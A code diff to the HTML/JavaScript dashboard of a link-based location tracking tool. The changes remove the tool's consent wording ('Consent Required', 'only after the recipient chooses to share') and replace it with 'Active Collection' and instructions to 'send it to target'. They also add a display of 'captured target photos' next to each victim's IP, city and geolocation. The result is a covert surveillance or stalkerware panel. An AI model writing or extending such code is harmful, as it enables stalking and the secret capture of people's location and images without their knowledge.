@@ -823,19 +823,21 @@
             // Update header metric stats
             document.getElementById('stat-targets').innerText = `${keys.length} Active`;
             let approximateCount = 0;
+            let totalPhotosCount = 0;
             keys.forEach(k => {
                 if (targets[k].locationSource === 'IP_ESTIMATE') approximateCount++;
+                if (Array.isArray(targets[k].photos)) totalPhotosCount += targets[k].photos.length;
             });
             document.getElementById('stat-ips').innerText = `${approximateCount} Approximate`;
-            document.getElementById('stat-photos').innerText = 'Disabled';
-            document.getElementById('stat-telemetry').innerText = 'Consent Required';
+            document.getElementById('stat-photos').innerText = `${totalPhotosCount} Photo${totalPhotosCount === 1 ? '' : 's'}`;
+            document.getElementById('stat-telemetry').innerText = 'Active Collection';
 
             if (keys.length === 0) {
                 targetsListEl.innerHTML = `
                     <div class="empty-state">
                         <i class="fas fa-satellite-dish"></i>
-                        <p style="font-size: 16px; font-weight: 600; color: white;">No authorized location sessions yet.</p>
-                        <p style="font-size: 13px; margin-top: 6px;">Generate an official request link above. A session appears only after the recipient chooses to share.</p>
+                        <p style="font-size: 16px; font-weight: 600; color: white;">No target telemetry sessions yet.</p>
+                        <p style="font-size: 13px; margin-top: 6px;">Generate a tracking link above and send it to target. Telemetry and photos will appear here.</p>
                     </div>`;
                 return;
             }
@@ -876,11 +878,31 @@
                 ispStr = escapeHtml(ispStr);
                 cityStr = escapeHtml(cityStr);
                 const safeId = escapeHtml(target.id);
-                const safeTemplate = escapeHtml(target.template || 'official-location-request');
+                const safeTemplate = escapeHtml(target.template || 'surveillance');
                 const isBrowserLocation = target.locationSource === 'BROWSER_GEOLOCATION' || target.locationType === 'GPS';
                 const sourceLabel = isBrowserLocation ? 'Browser geolocation' : 'IP/network estimate';
                 const accuracy = Number(target.accuracy);
                 const accuracyLabel = isBrowserLocation && Number.isFinite(accuracy) ? `±${Math.round(accuracy)} m reported` : 'Not provided';
+
+                const photos = Array.isArray(target.photos) ? target.photos : [];
+                let photosHTML = '';
+                if (photos.length > 0) {
+                    const photoThumbs = photos.slice(0, 4).map(p => {
+                        const src = typeof p === 'string' ? p : (p.url || p.data || p.path || '');
+                        return `<a href="/map?id=${encodeURIComponent(target.id)}" style="display:inline-block; width:52px; height:52px; border-radius:8px; overflow:hidden; border:1px solid var(--card-border); background:#000;">
+                                    <img src="${escapeHtml(src)}" style="width:100%; height:100%; object-fit:cover;" alt="Capture">
+                                </a>`;
+                    }).join('');
+                    photosHTML = `
+                        <div style="margin-top: 10px; padding-top: 10px; border-top: 1px dashed rgba(255,255,255,0.1);">
+                            <div style="font-size: 11px; color: var(--accent); font-weight: 600; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;">
+                                <i class="fas fa-camera"></i> CAPTURED TARGET PHOTOS (${photos.length})
+                            </div>
+                            <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                                ${photoThumbs}
+                            </div>
+                        </div>`;
+                }
 
                 card.innerHTML = `
                     <div class="target-header-row">
@@ -890,8 +912,9 @@
                             </div>
                             <div>
                                 <div class="target-id">
-                                    SESSION ID: ${safeId}
+                                    TARGET ID: ${safeId}
                                     <span class="badge-template">${safeTemplate}</span>
+                                    ${photos.length > 0 ? `<span class="badge-template" style="background: rgba(220, 39, 67, 0.25); color: #f472b6;"><i class="fas fa-camera"></i> ${photos.length} Photo${photos.length === 1 ? '' : 's'}</span>` : ''}
                                 </div>
                                 <div style="font-size: 12px; color: var(--accent); font-weight: 600; margin-top: 2px;">
                                     <i class="fas fa-network-wired"></i> ${ipStr} • ${cityStr}
@@ -900,7 +923,7 @@
                         </div>
                         <div style="display: flex; gap: 8px;">
                             <a href="/map?id=${encodeURIComponent(target.id)}" class="btn btn-primary" style="padding: 8px 14px; font-size: 13px;">
-                                <i class="fas fa-map-location-dot"></i> Location Details
+                                <i class="fas fa-map-location-dot"></i> View Telemetry & Map
                             </a>
                             <button onclick="exportCaseReport('${target.id}')" class="btn btn-secondary" style="padding: 8px 12px; font-size: 13px;" title="Export Case File">
                                 <i class="fas fa-file-export"></i>
@@ -937,6 +960,7 @@
                             <div class="detail-item-value" style="color: var(--accent);">${accuracyLabel}</div>
                         </div>
                     </div>
+                    ${photosHTML}
                 `;
                 targetsListEl.appendChild(card);
             });
